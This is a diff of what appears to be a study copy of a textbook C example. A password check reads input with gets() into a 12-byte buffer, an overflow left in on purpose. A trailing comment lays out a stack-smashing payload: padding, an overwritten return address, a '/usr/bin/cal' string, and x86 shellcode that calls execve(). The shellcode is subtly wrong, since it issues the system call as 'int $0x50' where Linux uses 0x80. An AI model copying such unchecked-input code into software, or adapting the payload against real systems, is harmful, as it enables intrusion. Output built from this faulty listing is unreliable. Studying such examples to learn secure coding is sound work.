@@ -1,48 +1,58 @@
+#include <stdio.h>
+#include <string.h>
+#include <stdlib.h>
 
-pass.o:     file format pe-i386
+int isPasswordOK(void) {
+    char password[12];
+    gets(password); // potential for a buffer overflow
+    if (!strcmp(password, "goodpass"))
+        return 1;
+    else return 0;
+}
 
+int main(void)
+{
+    int PwStatus;
+    puts("Enter Password: ");
+    PwStatus = isPasswordOK();
+    if (!PwStatus) {
+        puts("Access denied");
+        exit(-1);
+    }
+    else
+        puts("Access granted");
+}
 
-Disassembly of section .text:
+// following Linux exploit from the book
 
-00000000 <_isPasswordOK>:
-   0:	55                   	push   %ebp
-   1:	89 e5                	mov    %esp,%ebp
-   3:	83 ec 28             	sub    $0x28,%esp
-   6:	8d 45 ec             	lea    -0x14(%ebp),%eax
-   9:	89 04 24             	mov    %eax,(%esp)
-   c:	e8 00 00 00 00       	call   11 <_isPasswordOK+0x11>
-  11:	c7 44 24 04 00 00 00 	movl   $0x0,0x4(%esp)
-  18:	00 
-  19:	8d 45 ec             	lea    -0x14(%ebp),%eax
-  1c:	89 04 24             	mov    %eax,(%esp)
-  1f:	e8 00 00 00 00       	call   24 <_isPasswordOK+0x24>
-  24:	85 c0                	test   %eax,%eax
-  26:	75 07                	jne    2f <_isPasswordOK+0x2f>
-  28:	b8 01 00 00 00       	mov    $0x1,%eax
-  2d:	eb 05                	jmp    34 <_isPasswordOK+0x34>
-  2f:	b8 00 00 00 00       	mov    $0x0,%eax
-  34:	c9                   	leave  
-  35:	c3                   	ret    
+/*
+// buf[12]
+00 00 00 00
+00 00 00 00
+00 00 00 00
 
-00000036 <_main>:
-  36:	55                   	push   %ebp
-  37:	89 e5                	mov    %esp,%ebp
-  39:	83 e4 f0             	and    $0xfffffff0,%esp
-  3c:	83 ec 20             	sub    $0x20,%esp
-  3f:	e8 00 00 00 00       	call   44 <_main+0xe>
-  44:	c7 04 24 09 00 00 00 	movl   $0x9,(%esp)
-  4b:	e8 00 00 00 00       	call   50 <_main+0x1a>
-  50:	e8 ab ff ff ff       	call   0 <_isPasswordOK>
-  55:	89 44 24 1c          	mov    %eax,0x1c(%esp)
-  59:	83 7c 24 1c 00       	cmpl   $0x0,0x1c(%esp)
-  5e:	75 18                	jne    78 <_main+0x42>
-  60:	c7 04 24 1a 00 00 00 	movl   $0x1a,(%esp)
-  67:	e8 00 00 00 00       	call   6c <_main+0x36>
-  6c:	c7 04 24 ff ff ff ff 	movl   $0xffffffff,(%esp)
-  73:	e8 00 00 00 00       	call   78 <_main+0x42>
-  78:	c7 04 24 28 00 00 00 	movl   $0x28,(%esp)
-  7f:	e8 00 00 00 00       	call   84 <_main+0x4e>
-  84:	b8 00 00 00 00       	mov    $0x0,%eax
-  89:	c9                   	leave  
-  8a:	c3                   	ret    
-  8b:	90                   	nop
+/. %ebp
+00 00 00 00
+
+/. return address   // address of the beginning of the exploit code
+78 fd ff bf
+
+// "/usr/bin/cal"   // just a 12-character string
+2f 75 73 72
+2f 62 69 6e
+2f 63 61 6c
+00 00 00 00
+
+// null pointer     // address 4 bytes prior to the exploit code, the NULL
+74 fd ff bf
+
+// NULL
+00 00 00 00
+
+// exploit code
+b0 0b       // mov  $0xb, %eax
+8d 1c 24    // lea  (%esp), %ebx        // at this point, %esp points to the beginning of the "/usr/bin/cal" string. Load this is as the filename argument to execve()
+8d 4c 24 f0 // lea  -0x10(%esp), %ecx   // loads a pointer to a NULL pointer into the argv argument
+8b 54 24 ec // mov  -0x14(%esp), %edx   // loads a NULL pointer into envp argument
+cd 50       // int  $0x50               // invokes execve(), linux function
+*/
